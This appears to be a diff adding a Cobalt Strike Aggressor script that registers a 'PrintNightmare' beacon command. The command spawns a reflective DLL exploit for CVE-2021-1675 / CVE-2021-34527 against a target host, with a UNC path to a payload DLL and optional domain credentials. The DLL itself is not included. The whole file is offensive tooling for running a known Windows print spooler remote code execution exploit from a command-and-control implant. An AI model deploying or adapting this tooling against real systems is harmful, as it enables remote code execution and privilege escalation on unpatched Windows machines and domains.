@@ -1,0 +1,21 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+#Reflective Dll implementation of the PrintNightmare PoC originally created by Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)
+
+#register help
+beacon_command_register("PrintNightmare", "CVE-2021-1675 / CVE-2021-34527 exploit.",
+	"Synopsis: PrintNightmare <target ip or hostname> <UNC path to payload Dll> <optional domain> <optional username> <optional password>\n\n" .
+	"Reflective Dll implementation of the PrintNightmare (CVE-2021-1675 / CVE-2021-34527) exploit.\n");
+
+alias PrintNightmare {
+	$bid = $1;
+	$params = substr($0, 15);
+
+	if ($params eq "") {
+		berror($bid, "Specify params.");
+		return;
+	}
+
+	bdllspawn($1, script_resource("PrintNightmare.dll"), $params, "PrintNightmare", 5000, false);
+}
